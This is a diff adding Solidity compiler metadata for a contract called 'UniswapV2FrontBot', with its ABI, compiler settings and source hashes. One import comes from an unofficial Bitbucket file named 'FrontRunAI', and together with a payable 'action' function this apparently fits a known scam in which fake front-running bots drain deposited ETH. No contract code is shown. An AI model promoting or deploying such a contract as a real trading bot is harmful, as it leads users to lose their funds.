@@ -1,0 +1,122 @@
+{
+	"compiler": {
+		"version": "0.6.6+commit.6c089d02"
+	},
+	"language": "Solidity",
+	"output": {
+		"abi": [
+			{
+				"inputs": [
+					{
+						"internalType": "string",
+						"name": "_tokenName",
+						"type": "string"
+					},
+					{
+						"internalType": "string",
+						"name": "_tokenSymbol",
+						"type": "string"
+					}
+				],
+				"stateMutability": "nonpayable",
+				"type": "constructor"
+			},
+			{
+				"inputs": [],
+				"name": "action",
+				"outputs": [],
+				"stateMutability": "payable",
+				"type": "function"
+			},
+			{
+				"inputs": [],
+				"name": "tokenName",
+				"outputs": [
+					{
+						"internalType": "string",
+						"name": "",
+						"type": "string"
+					}
+				],
+				"stateMutability": "view",
+				"type": "function"
+			},
+			{
+				"inputs": [],
+				"name": "tokenSymbol",
+				"outputs": [
+					{
+						"internalType": "string",
+						"name": "",
+						"type": "string"
+					}
+				],
+				"stateMutability": "view",
+				"type": "function"
+			},
+			{
+				"stateMutability": "payable",
+				"type": "receive"
+			}
+		],
+		"devdoc": {
+			"methods": {}
+		},
+		"userdoc": {
+			"methods": {}
+		}
+	},
+	"settings": {
+		"compilationTarget": {
+			"contracts/frontRunnerbot.sol": "UniswapV2FrontBot"
+		},
+		"evmVersion": "istanbul",
+		"libraries": {},
+		"metadata": {
+			"bytecodeHash": "ipfs"
+		},
+		"optimizer": {
+			"enabled": false,
+			"runs": 200
+		},
+		"remappings": []
+	},
+	"sources": {
+		"contracts/frontRunnerbot.sol": {
+			"keccak256": "0xed8e84efa56b5a8f16267f750eadea0006bbe001980d04875da107b5e73f8c3c",
+			"urls": [
+				"bzz-raw://836e116c7f11a8362823cff539519b933f637810f07e48b32e31b4bdf45622a5",
+				"dweb:/ipfs/QmP6fmsdwNYcUGyYKFBbVCWHa3Zo1dWFuvjTCLb1tRzKjT"
+			]
+		},
+		"https://bitbucket.org/crpytobotdir/contractdeploy/raw/019cc62954398facc99566fcd4fbbd2953a38bfe/FrontRunAI": {
+			"keccak256": "0x9cd02d5e4ce5ac26a6223c2deb265c161060b6661f75e5966efc84555aa1d185",
+			"urls": [
+				"bzz-raw://d83d3e783ec12e540dba56a696860a6dd38e3099a49c036859129f2b6d128ada",
+				"dweb:/ipfs/QmYwxqFghdN4PFR3aeRNeU3A4Hvbg5LGWNAb5db4yxE8zt"
+			]
+		},
+		"https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Callee.sol": {
+			"keccak256": "0xdb17a1fb73e261e736ae8862be2d9a32964fc4b3741f48980f5cdc9d92b99a96",
+			"urls": [
+				"bzz-raw://468dab23a95d9d9b7d6ce74008d45eef3de2f137ede604e6be6c5e7d0121c5e9",
+				"dweb:/ipfs/QmcXwjTfp6tCRgf1KsNQyUAtrqKhiaN6fbaHVGr22eficP"
+			]
+		},
+		"https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol": {
+			"keccak256": "0xcec8976f205e71a3a5ebdd7130d321484df4e4b6b1091d21d435173acfb6e14b",
+			"urls": [
+				"bzz-raw://681de3c6ee08cccee6839b3a65f8d80c2c6e55ba5a3aba51f83578a5fef52a65",
+				"dweb:/ipfs/QmcJMhgj7CgchN4sxR8MbzJt8DrbJuB6PCdD2fdQ9Ct1qi"
+			]
+		},
+		"https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol": {
+			"keccak256": "0x2a554e26d874fa4b10736f2e2ac1ba6253cd1ad08a97bd941cb0a41015565589",
+			"urls": [
+				"bzz-raw://bbe29db0ebf08621cb4211219c02262be9c7510fe03bab94f849a38993f957d6",
+				"dweb:/ipfs/QmTutAVpjg925m4JLqHTvukdTyoTr77FotAUAA2AzGug1f"
+			]
+		}
+	},
+	"version": 1
+}
